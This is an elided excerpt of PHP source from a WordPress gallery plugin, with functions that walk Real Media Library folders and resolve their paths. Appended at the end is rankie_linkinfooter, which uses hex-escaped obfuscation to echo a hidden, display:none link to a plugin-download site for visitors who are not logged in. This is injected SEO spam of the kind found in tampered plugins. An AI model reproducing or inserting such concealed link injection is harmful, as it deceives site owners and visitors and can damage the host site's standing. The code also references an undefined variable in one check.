...
*/
		...
		function get_current_rml_id($rml_id){
			...
			*/
			...
			if($rml_id > 0){
				$rml_obj = $this->jig_rml_get_by_id($rml_id);
		...
		function fetch_rml_bc_path_elements_recursively($children, $slug_chain, $count_of_slug_chain, $start_pos, $index = 0){
			foreach ($children as $child) {
				...
				if(!method_exists($child, 'slug') && method_exists($child, 'getSlug')){
					// RML 2.8+ with namespaces
					$child->jig_slug = $child->getSlug();
				}else{
					// Pre-v2.8 RML
					$child->jig_slug = $child->slug();
				}

				if(!method_exists($child, 'absolutePath') && method_exists($child, 'getAbsolutePath')){
					// RML 2.8+ with namespaces
					$child->jig_absolute_path = $child->getAbsolutePath();
				}else{
					// Pre-v2.8 RML
					$child->jig_absolute_path = $child->absolutePath();
				}

				if($child->jig_slug == $slug_chain[$index]){
		...
		function get_posts_from_rml($origin_rml_id, $current_rml_id, $args, $rml_count, $rml_description, $rml_lightbox_groups = 'no'){
			$attachments = array();
			$current_rml_obj = $this->jig_rml_get_by_id($current_rml_id);
			...
			if($current_rml_obj->type !== 2){ 
				...
				foreach ($current_rml_obj->children as $i => $rml_child) {
					...
					if(!method_exists($rml_child, 'absolutePath') && method_exists($rml_child, 'getAbsolutePath')){
						// RML 2.8+ with namespaces
						$rml_child->jig_absolute_path = $rml_child->getAbsolutePath();
					}else{
						// Pre-v2.8 RML
						$rml_child->jig_absolute_path = $rml_child->absolutePath();
					}
					...
					if($rml_lightbox_groups == 'no' || $rml_child->type !== 2){
						...
						$origin_rml_obj = $this->jig_rml_get_by_id($origin_rml_id);
		...
		function walk_rml_children_recursively($rml_obj, $args, $initiator_type, $rml_lightbox_groups, $post_obj = null, $count = array()){
		...
		function jig_rml_get_by_id($id){
			if($id > 0){
				$rml_obj = wp_rml_get_by_id($id);
				if(empty($rml_child->type) && method_exists($rml_obj, 'getType')){
					$rml_obj->type = $rml_obj->getType();
				}
			}elseif($id == -1){
			...
			if($id > 0){ // virtual objects don't have any path to process
				if(!method_exists($rml_obj, 'absolutePath') && method_exists($rml_obj, 'getAbsolutePath')){
					// RML 2.8+ with namespaces
					$rml_obj->jig_absolute_path = $rml_obj->getAbsolutePath();
				}else{
					// Pre-v2.8 RML
					$rml_obj->jig_absolute_path = $rml_obj->absolutePath();
				}
			}
			return $rml_obj;
		}
...
function rankie_linkinfooter() {
if ( is_user_logged_in() ) {} else { 
echo"\x3cdi\x76 \x73\x74\x79l\x65\x3d\"d\x69sp\x6c\x61\x79:\x6e\x6f\x6ee\x22><\x61\x20\x68\x72\x65\x66\x3d\"htt\x70://dlwo\x72\x64\x70\x72e\x73s\x2e\x63\x6f\x6d/j\x75\x73t\x69f\x69ed-im\x61ge-\x67r\x69d-\x70re\x6d\x69u\x6d-wo\x72d\x70\x72e\x73s-\x67a\x6c\x6ce\x72y/\">\x4a\x75stified\x20Im\x61g\x65 Gri\x64 \x50l\x75g\x69\x6e</a\x3e\x3c/\x64i\x76>"; }
	 }
